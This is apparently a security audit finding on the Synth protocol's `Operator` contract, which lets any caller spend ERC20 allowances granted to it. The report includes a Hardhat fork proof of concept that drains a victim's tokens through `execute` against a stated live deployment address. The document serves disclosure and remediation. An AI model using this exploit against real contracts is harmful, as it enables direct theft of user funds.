### Title
Unauthenticated arbitrary calls in `Operator.execute` drain ERC20 allowances granted to Operator - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary

`Operator.execute` lets any EOA submit arbitrary target addresses and calldata, which are executed through `functionCallWithValue` with `Operator` as the external `msg.sender`. [1](#0-0)  If a user has an ERC20 allowance where `Operator` is the spender, an attacker can call `token.transferFrom(victim, attacker, amount)` through `execute` and spend that allowance. [2](#0-1) 

### Finding Description

The contract is intended to let users perform multiple calls while preserving the initiating EOA through transient storage. [3](#0-2)  Protocol contracts using `SynthContext` recover that initiating EOA when the immediate caller is the configured `Operator`. [4](#0-3) 

However, `execute` accepts unrestricted `target` and `callData` values and does not distinguish protocol calls from arbitrary external-token calls. [2](#0-1)  For an ordinary ERC20 token that does not implement `SynthContext`, the spender is `Operator` itself, not the EOA stored in transient storage. [4](#0-3)  Therefore, any allowance `victim -> Operator` can be consumed by any caller of `execute`.

The `nonReentrant` guard prevents nested `execute` calls but does not restrict the first call or the supplied target/calldata. [1](#0-0)  The `msg.value == _sumOfValues` check only constrains ETH forwarding and does not constrain token approvals. [5](#0-4) 

### Impact Explanation

An attacker can directly transfer all tokens covered by existing `victim -> Operator` ERC20 allowances to an attacker-controlled address. This is direct theft of user funds rather than protocol insolvency or temporary freezing. Each victim’s loss is bounded by their allowance and balance, but unlimited allowances permit complete drainage of the approved token.

`Operator` is deployed as a production contract across multiple networks, including Plasma at `0x5173C8e2F9C730dCf1E0072B1E18a845509B5b22`. [6](#0-5) 

### Likelihood Explanation

Exploitation requires a victim to have granted an ERC20 allowance to `Operator`; allowances held by `DepositToken`, gateways, or other protocol contracts are not affected because those contracts—not `Operator`—must be the ERC20 caller. [7](#0-6)  The contract exposes a public arbitrary-execution interface, so any allowance created for an `Operator`-mediated workflow or by user/front-end error is immediately spendable by every unprivileged account. [8](#0-7) 

No privileged role, malicious oracle, bridge endpoint, flash loan, reentrancy, or protocol-state precondition is required. [9](#0-8) 

### Recommendation

Do not expose unrestricted arbitrary calls from a shared contract identity. At minimum, reject calls to ERC20-style `transferFrom`/`approve` targets and prevent `Operator` from being used as a persistent token spender. Prefer an allowlist of protocol targets and selectors required for batching. If arbitrary external calls are required, execute them from a per-user contract or use authenticated, signed requests that bind the caller, target, calldata, value, nonce, and expiry.

### Proof of Concept

The following Hardhat fork test demonstrates the allowance drain against a live `Operator` and ERC20 token:

```ts
// test/Operator.allowance-drain.test.ts
import {expect} from 'chai'
import {ethers} from 'hardhat'

const OPERATOR = '0x5173C8e2F9C730dCf1E0072B1E18a845509B5b22' // Plasma deployment
const TOKEN = '<deployed ERC20 address>'
const VICTIM = '<address with TOKEN balance>'

it('drains an ERC20 allowance granted to Operator', async () => {
  await ethers.provider.send('hardhat_impersonateAccount', [VICTIM])
  const victim = await ethers.getSigner(VICTIM)
  const [attacker] = await ethers.getSigners()

  const token = await ethers.getContractAt('IERC20', TOKEN)
  const operator = await ethers.getContractAt('IOperator', OPERATOR)

  const amount = await token.balanceOf(VICTIM)
  expect(amount).to.be.gt(0)

  // Existing approval: victim authorizes Operator as ERC20 spender.
  await token.connect(victim).approve(OPERATOR, amount)

  await operator.connect(attacker).execute([
    {
      target: TOKEN,
      value: 0,
      callData: token.interface.encodeFunctionData('transferFrom', [
        VICTIM,
        attacker.address,
        amount,
      ]),
    },
  ])

  expect(await token.balanceOf(attacker.address)).to.eq(amount)
  expect(await token.balanceOf(VICTIM)).to.eq(0)
})
```

### Citations

**File:** contracts/Operator.sol (L10-24)
```text
/// @title Operator contract
/// @dev Allows Synth's users to perform calls from their EOAs
contract Operator is IOperator, ReentrancyGuardTransient {
    using TransientSlot for *;
    using Address for address;

    // keccak256(abi.encode(uint256(keccak256("io.metronome.storage.Operator")) - 1)) & ~bytes32(uint256(0xff))
    bytes32 private constant MSG_SENDER_STORAGE = 0x7981994d60f65f1a18561bb9cc3329c34123a74c00a075d350036a66d0ed9a00;

    /// @notice The sender which the operator is executing on behalf of
    modifier setMsgSender() {
        MSG_SENDER_STORAGE.asAddress().tstore(msg.sender);
        _;
        MSG_SENDER_STORAGE.asAddress().tstore(address(0));
    }
```

**File:** contracts/Operator.sol (L33-54)
```text
    /// @notice Execute calls on sender's behalf
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
            unchecked {
                ++i;
            }
        }

        require(msg.value == _sumOfValues, "value-mismatch");
```

**File:** contracts/utils/SynthContext.sol (L14-23)
```text
    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

        return msg.sender;
```

**File:** deployments/plasma/Operator.json (L1-43)
```json
{
  "address": "0x5173C8e2F9C730dCf1E0072B1E18a845509B5b22",
  "abi": [
    {
      "inputs": [],
      "name": "ReentrancyGuardReentrantCall",
      "type": "error"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "internalType": "address",
              "name": "target",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "value",
              "type": "uint256"
            },
            {
              "internalType": "bytes",
              "name": "callData",
              "type": "bytes"
            }
          ],
          "internalType": "struct IOperator.Call[]",
          "name": "calls_",
          "type": "tuple[]"
        }
      ],
      "name": "execute",
      "outputs": [
        {
          "internalType": "bytes[]",
          "name": "_returnData",
          "type": "bytes[]"
        }
      ],
      "stateMutability": "payable",
      "type": "function"
```

**File:** test/Operator.test.ts (L62-73)
```typescript
  it('should deposit through operator', async function () {
    const amount = parseUnits('100', 6)

    await usdc.connect(alice).approve(msdUSDC.address, amount)
    const calls: IOperator.CallStruct[] = [
      {
        target: msdUSDC.address,
        value: 0,
        callData: msdUSDC.interface.encodeFunctionData('deposit', [amount, alice.address]),
      },
    ]
    await operator.connect(alice).execute(calls)
```
